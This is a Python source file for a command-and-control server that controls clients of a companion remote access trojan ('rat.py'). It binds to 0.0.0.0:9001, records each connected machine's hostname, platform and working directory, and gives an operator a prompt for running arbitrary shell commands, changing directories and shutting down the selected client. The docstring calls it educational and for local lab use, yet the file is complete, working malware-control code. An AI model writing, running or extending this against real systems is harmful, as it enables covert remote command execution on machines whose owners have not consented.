#!/usr/bin/env python3
"""
Educational CNC (command-and-control) server for the simple RAT client.

This is a minimal text-based controller to experiment with the protocol in
`rat.py`. It is meant for LOCAL LAB USE ONLY and must not be used on any
system or network without explicit permission.

Usage (from the controlling machine):
    python cnc_server.py --host 0.0.0.0 --port 9001

Then start one or more RAT clients pointing at this host/port.
You can type `help` at the server prompt for available commands.
"""

from __future__ import annotations

import argparse
import json
import socket
import threading
from dataclasses import dataclass, field
from typing import Dict, Optional


JsonDict = Dict[str, object]


def send_json_line(sock: socket.socket, payload: JsonDict) -> None:
    data = (json.dumps(payload) + "\n").encode("utf-8", errors="ignore")
    sock.sendall(data)


def recv_json_line(sock: socket.socket) -> Optional[JsonDict]:
    chunks: list[bytes] = []
    while True:
        chunk = sock.recv(1)
        if not chunk:
            if not chunks:
                return None
            break
        if chunk == b"\n":
            break
        chunks.append(chunk)
    raw = b"".join(chunks).decode("utf-8", errors="ignore").strip()
    if not raw:
        return None
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        return None


@dataclass
class ClientSession:
    id: int
    sock: socket.socket
    address: tuple[str, int]
    info: JsonDict = field(default_factory=dict)
    alive: bool = True


class CNCServer:
    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self._next_id = 1
        self.clients: Dict[int, ClientSession] = {}
        self._lock = threading.Lock()
        self._listener: Optional[socket.socket] = None

    # Listener and client management -------------------------------------------------

    def start(self) -> None:
        self._listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._listener.bind((self.host, self.port))
        self._listener.listen(5)
        print(f"[cnc] Listening on {self.host}:{self.port}")

        threading.Thread(target=self._accept_loop, daemon=True).start()

    def _accept_loop(self) -> None:
        assert self._listener is not None
        while True:
            try:
                client_sock, addr = self._listener.accept()
            except OSError:
                break
            with self._lock:
                cid = self._next_id
                self._next_id += 1
                session = ClientSession(id=cid, sock=client_sock, address=addr)
                self.clients[cid] = session
            print(f"[cnc] New client #{cid} from {addr[0]}:{addr[1]}")
            threading.Thread(
                target=self._client_reader, args=(session,), daemon=True
            ).start()

    def _client_reader(self, session: ClientSession) -> None:
        sock = session.sock
        cid = session.id
        try:
            while True:
                msg = recv_json_line(sock)
                if msg is None:
                    print(f"[cnc] Client #{cid} disconnected")
                    break

                mtype = msg.get("type")
                if mtype == "hello":
                    session.info = msg
                    print(f"[cnc] Client #{cid} hello: {msg}")
                elif mtype == "heartbeat":
                    # Just log briefly; not essential.
                    pass
                else:
                    print(f"[cnc] From client #{cid}: {msg}")
        finally:
            session.alive = False
            with self._lock:
                if cid in self.clients:
                    del self.clients[cid]
            try:
                sock.close()
            except OSError:
                pass

    # Command helpers ----------------------------------------------------------------

    def list_clients(self) -> None:
        with self._lock:
            if not self.clients:
                print("[cnc] No clients connected.")
                return
            for cid, session in self.clients.items():
                info = session.info
                host = info.get("hostname") if isinstance(info, dict) else None
                plat = info.get("platform") if isinstance(info, dict) else None
                cwd = info.get("cwd") if isinstance(info, dict) else None
                print(
                    f"  #{cid}: {session.address[0]}:{session.address[1]} "
                    f"host={host!r} platform={plat!r} cwd={cwd!r}"
                )

    def get_client(self, cid: int) -> Optional[ClientSession]:
        with self._lock:
            return self.clients.get(cid)


def run_cli(server: CNCServer) -> None:
    """
    Blocking command-line interface for interacting with clients.
    """
    help_text = """
Commands:
  help                  Show this help
  list                  List connected clients
  use <id>              Select a client to control
  ping                  Send a ping to the selected client
  exec <cmd>            Execute a shell command on the selected client
  cd <path>             Change working directory on the selected client
  pwd                   Print working directory on the selected client
  exit_client           Ask the selected client to exit
  quit                  Quit this CNC server
""".strip()

    selected_id: Optional[int] = None

    print(help_text)
    while True:
        prompt = "cnc"
        if selected_id is not None:
            prompt += f"(#{selected_id})"
        try:
            line = input(f"{prompt}> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[cnc] Quitting.")
            break

        if not line:
            continue

        parts = line.split(maxsplit=1)
        cmd = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""

        if cmd in ("help", "?"):
            print(help_text)
        elif cmd == "list":
            server.list_clients()
        elif cmd == "use":
            if not arg:
                print("Usage: use <id>")
                continue
            try:
                cid = int(arg)
            except ValueError:
                print("Client id must be an integer.")
                continue
            session = server.get_client(cid)
            if session is None:
                print(f"No client with id {cid}")
            else:
                selected_id = cid
                print(f"[cnc] Selected client #{cid}")
        elif cmd == "ping":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "ping"})
        elif cmd == "exec":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            if not arg:
                print("Usage: exec <shell command>")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "exec", "cmd": arg})
        elif cmd == "cd":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            if not arg:
                print("Usage: cd <path>")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "cd", "path": arg})
        elif cmd == "pwd":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "pwd"})
        elif cmd == "exit_client":
            if selected_id is None:
                print("No client selected. Use `list` and `use <id>` first.")
                continue
            session = server.get_client(selected_id)
            if session is None:
                print("Selected client is no longer connected.")
                selected_id = None
                continue
            send_json_line(session.sock, {"type": "exit"})
        elif cmd in ("quit", "q", "exit"):
            print("[cnc] Quitting.")
            break
        else:
            print("Unknown command. Type `help` for a list of commands.")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Educational CNC server for the simple RAT client.",
    )
    parser.add_argument(
        "--host",
        default="0.0.0.0",
        help="Host/IP to bind the CNC server to (default: 0.0.0.0)",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=9001,
        help="TCP port to listen on (default: 9001)",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    server = CNCServer(args.host, args.port)
    server.start()
    run_cli(server)


if __name__ == "__main__":
    main()


